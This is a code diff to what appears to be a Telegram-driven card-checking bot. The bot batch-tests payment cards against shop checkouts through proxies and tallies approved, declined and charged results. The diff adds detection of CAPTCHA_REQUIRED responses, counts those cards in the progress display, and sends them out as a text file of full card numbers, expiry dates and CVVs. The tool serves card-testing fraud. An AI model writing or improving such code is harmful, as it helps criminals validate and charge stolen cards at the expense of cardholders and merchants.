@@ -1301,6 +1301,10 @@ def check_single_card(card: Dict, sites: List[str], proxies_override: Optional[D
                     "PAYMENTS_NON_TEST_ORDER_LIMIT_REACHED",
                 )
                 
+                # --- CAPTCHA detection: return immediately so runner can track it ---
+                if "CAPTCHA_METADATA_MISSING" in submit_upper or "CAPTCHA" in submit_upper:
+                    return "captcha", '"code": "CAPTCHA_REQUIRED"', _amount_display(), site_label, used_proxy_url, shop_url, None
+                
                 # Check if submit_code indicates a site-level error that requires site removal
                 is_site_level_error = any(tok in submit_upper for tok in site_level_submit_errors)
                 
@@ -1564,6 +1568,8 @@ class BatchRunner:
         self.approved = 0
         self.declined = 0
         self.charged = 0
+        self.captcha = 0
+        self.captcha_cards: List[Dict] = []
         self.start_ts = time.time()
         self.lock = asyncio.Lock()
         self.batch_id = batch_id
@@ -1736,7 +1742,7 @@ class BatchRunner:
 
     async def run(self, update: Update, context: ContextTypes.DEFAULT_TYPE, title: str):
         progress_msg = await update.effective_chat.send_message(
-            text=progress_block(self.total, self.processed, self.approved, self.declined, self.charged, self.start_ts),
+            text=progress_block(self.total, self.processed, self.approved, self.declined, self.charged, self.start_ts, self.captcha),
             parse_mode=ParseMode.HTML,
             disable_web_page_preview=True,
             reply_markup=self.stop_keyboard(),
@@ -1778,6 +1784,10 @@ class BatchRunner:
                 elif status == "declined":
                     self.declined += 1
                     self.processed += 1
+                elif status == "captcha":
+                    self.captcha += 1
+                    self.captcha_cards.append(card)
+                    self.processed += 1
                 else:
                     pass
                 current_time = time.time()
@@ -1786,7 +1796,7 @@ class BatchRunner:
                         await context.bot.edit_message_text(
                             chat_id=progress_msg.chat_id,
                             message_id=progress_msg.message_id,
-                            text=progress_block(self.total, self.processed, self.approved, self.declined, self.charged, self.start_ts),
+                            text=progress_block(self.total, self.processed, self.approved, self.declined, self.charged, self.start_ts, self.captcha),
                             parse_mode=ParseMode.HTML,
                             disable_web_page_preview=True,
                         )
@@ -1848,7 +1858,7 @@ class BatchRunner:
     async def run_with_notifications(self, update: Update, context: ContextTypes.DEFAULT_TYPE, title: str):
         try:
             progress_msg = await update.effective_chat.send_message(
-                text=progress_block(self.total, self.processed, self.approved, self.declined, self.charged, self.start_ts),
+                text=progress_block(self.total, self.processed, self.approved, self.declined, self.charged, self.start_ts, self.captcha),
                 parse_mode=ParseMode.HTML,
                 disable_web_page_preview=True,
                 reply_markup=self.stop_keyboard(),
@@ -1860,7 +1870,7 @@ class BatchRunner:
                     logger.warning(f"Flood control hit on initial message, waiting {retry_after} seconds")
                     await asyncio.sleep(retry_after)
                     progress_msg = await update.effective_chat.send_message(
-                        text=progress_block(self.total, self.processed, self.approved, self.declined, self.charged, self.start_ts),
+                        text=progress_block(self.total, self.processed, self.approved, self.declined, self.charged, self.start_ts, self.captcha),
                         parse_mode=ParseMode.HTML,
                         disable_web_page_preview=True,
                         reply_markup=self.stop_keyboard(),
@@ -2235,6 +2245,10 @@ class BatchRunner:
                 elif status == "declined":
                     self.declined += 1
                     self.processed += 1
+                elif status == "captcha":
+                    self.captcha += 1
+                    self.captcha_cards.append(card)
+                    self.processed += 1
                 else:
                     # Count unknown/other statuses as processed but not approved/declined/charged
                     self.processed += 1
@@ -2250,6 +2264,7 @@ class BatchRunner:
                                 "approved": self.approved,
                                 "declined": self.declined,
                                 "charged": self.charged,
+                                "captcha": self.captcha,
                                 "start_ts": self.start_ts,
                                 "title": title,
                             }
@@ -2554,6 +2569,7 @@ class BatchRunner:
                                 "approved": self.approved,
                                 "declined": self.declined,
                                 "charged": self.charged,
+                                "captcha": self.captcha,
                                 "start_ts": self.start_ts,
                                 "title": title,
                             }
@@ -2568,7 +2584,7 @@ class BatchRunner:
                             await context.bot.edit_message_text(
                                 chat_id=progress_msg.chat_id,
                                 message_id=progress_msg.message_id,
-                                text=progress_block(self.total, self.processed, self.approved, self.declined, self.charged, self.start_ts),
+                                text=progress_block(self.total, self.processed, self.approved, self.declined, self.charged, self.start_ts, self.captcha),
                                 parse_mode=ParseMode.HTML,
                                 disable_web_page_preview=True,
                                 reply_markup=self.stop_keyboard(),
@@ -2585,7 +2601,7 @@ class BatchRunner:
                                         await context.bot.edit_message_text(
                                             chat_id=progress_msg.chat_id,
                                             message_id=progress_msg.message_id,
-                                            text=progress_block(self.total, self.processed, self.approved, self.declined, self.charged, self.start_ts),
+                                            text=progress_block(self.total, self.processed, self.approved, self.declined, self.charged, self.start_ts, self.captcha),
                                             parse_mode=ParseMode.HTML,
                                             disable_web_page_preview=True,
                                             reply_markup=self.stop_keyboard(),
@@ -2696,7 +2712,7 @@ class BatchRunner:
                 await context.bot.edit_message_text(
                     chat_id=progress_msg.chat_id,
                     message_id=progress_msg.message_id,
-                    text=progress_block(self.total, self.processed, self.approved, self.declined, self.charged, self.start_ts),
+                    text=progress_block(self.total, self.processed, self.approved, self.declined, self.charged, self.start_ts, self.captcha),
                     parse_mode=ParseMode.HTML,
                     disable_web_page_preview=True,
                     reply_markup=None,
@@ -2710,11 +2726,15 @@ class BatchRunner:
                 f"Completed: {self.processed}/{self.total}\n"
                 f"Approved: {self.approved}\nDeclined: {self.declined}\nCharged: {self.charged}"
             )
+            if self.captcha > 0:
+                final_text += f"\nCAPTCHA: {self.captcha}"
         else:
             final_text = (
                 f"Stopped: {self.processed}/{self.total} (pending: {pending})\n"
                 f"Approved: {self.approved}\nDeclined: {self.declined}\nCharged: {self.charged}"
             )
+            if self.captcha > 0:
+                final_text += f"\nCAPTCHA: {self.captcha}"
         try:
             await update.effective_chat.send_message(
                 text=final_text,
@@ -2737,6 +2757,31 @@ class BatchRunner:
                     logger.error(f"Error sending final message: {e}")
             except Exception:
                 logger.error(f"Failed to send final message after retry: {e}")
+
+        # Send captcha cards as a .txt file if any were found
+        if self.captcha > 0 and self.captcha_cards:
+            try:
+                import io
+                lines = []
+                for c in self.captcha_cards:
+                    try:
+                        pan = str(c.get("number", ""))
+                        mm = int(c.get("month", 0) or 0)
+                        yy = int(c.get("year", 0) or 0)
+                        cvv = str(c.get("verification_value", ""))
+                        lines.append(f"{pan}|{mm:02d}|{yy % 100:02d}|{cvv}")
+                    except Exception:
+                        pass
+                if lines:
+                    file_content = "\n".join(lines).encode("utf-8")
+                    fname = f"captcha_required_{self.user_id}_{self.batch_id}.txt"
+                    await update.effective_chat.send_document(
+                        document=io.BytesIO(file_content),
+                        filename=fname,
+                        caption=f"⚠️ {self.captcha} cards with CAPTCHA_REQUIRED (skipped in NO_RETRY mode)",
+                    )
+            except Exception as cap_err:
+                logger.error(f"Failed to send captcha file: {cap_err}")
 
 def mask_proxy_password(proxy_url: str) -> str:
     """Mask the password in a proxy URL, leaving other parts visible."""
